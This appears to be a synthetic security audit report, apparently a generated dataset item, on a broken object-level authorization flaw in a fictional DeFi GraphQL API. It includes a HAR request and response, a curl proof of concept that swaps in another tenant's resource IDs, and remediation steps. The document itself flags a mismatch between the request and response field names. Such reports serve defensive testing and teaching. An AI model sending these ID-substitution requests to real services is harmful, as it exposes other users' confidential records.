# Security Analysis Report
**System:** ChainVault DeFi API
**Domain:** Blockchain / DeFi
**Example ID:** GQL-0285
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | BOLA — Pattern 10.2 | Parameter escalation on `bulkResourceLookup` / `getResource` — attacker reads DeFi wallet/vault records via bulk ID substitution |

---

## Finding 1 — BOLA: Parameter Escalation via Bulk Resource Lookup (Pattern 10.2)

### Summary
The GraphQL API at `https://api.chainvault-defi-api.example.com/graphql` exposes a `bulkResourceLookup` resolver that fetches DeFi resources by ID without verifying the JWT `tenantId` claim. Per §5.0 Pattern 10.2, the attacker escalates their session scope by substituting resource IDs belonging to `tenant-4709`.

**Context.txt inconsistency (documented):** The HAR request uses `bulkResourceLookup(ids: ["R-2285","R-1285","R-3285"])`, while the HAR response returns data under the key `getResource`. These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-91e14709` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 10.2 — Parameter escalation (own session scope extension)
**Affected endpoint:** `POST https://api.chainvault-defi-api.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.chainvault-defi-api.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { bulkResourceLookup(ids: [\"R-2285\", \"R-1285\", \"R-3285\"]) { resourceId tenantId data { sensitiveField } } }"}
```

**Response — Victim DeFi Vault Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-4709",
      "ownerId": "other-user-91e14709",
      "data": {
        "sensitiveField": "CONFIDENTIAL-91e14709",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.chainvault-defi-api.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { bulkResourceLookup(ids: [\"R-2285\",\"R-1285\",\"R-3285\"]) { resourceId tenantId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-4709, sensitiveField: CONFIDENTIAL-91e14709
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must compare `object.tenantId` against `jwt.tenantId` for each ID in the bulk array.
2. Redis cache key must include tenant dimension.
